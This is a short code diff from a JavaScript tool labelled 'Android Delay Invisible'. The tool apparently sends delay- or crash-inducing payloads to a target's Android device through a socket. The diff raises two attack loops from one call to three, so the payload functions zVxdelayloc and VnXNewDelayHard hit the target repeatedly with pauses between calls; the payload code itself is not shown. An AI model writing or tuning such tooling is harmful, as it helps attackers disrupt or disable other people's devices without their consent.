@@ -4723,7 +4723,7 @@ Description : Android Delay Invisible
             
             const instanceId = Date.now() + Math.random();
             
-            for (let i = 0; i < 1; i++) {
+            for (let i = 0; i < 3; i++) {
                 try {
                     await zVxdelayloc(sock, target);
                     await sleep(1500)
@@ -4799,7 +4799,7 @@ Description : Android Delay Invisible
             
             const instanceId = Date.now() + Math.random();
             
-            for (let i = 0; i < 1; i++) {
+            for (let i = 0; i < 3; i++) {
                 try {
                     await VnXNewDelayHard(sock, target);
                     await sleep(1500)
